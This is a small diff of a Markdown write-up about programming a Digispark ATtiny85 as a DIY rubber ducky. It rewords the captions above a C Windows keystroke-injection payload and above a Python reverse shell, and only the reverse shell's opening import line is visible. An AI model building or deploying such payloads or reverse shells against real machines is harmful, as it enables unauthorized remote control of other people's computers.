@@ -22,7 +22,7 @@ Digispark attiny85 can be programmed in C as a rubber ducky, here can be seen in
   Your browser does not support the video tag.
 </video> 
 
-Here the C windows payload for the DIY rubber ducky
+The C windows payload for the DIY rubber ducky
 
 ```c
 #include "DigiKeyboard.h"
@@ -53,7 +53,7 @@ void loop() {
 }
 ```
 
-Here the code for the reverse shell:
+And the code for the reverse shell:
 
 ```python
 import os,socket,subprocess,threading;
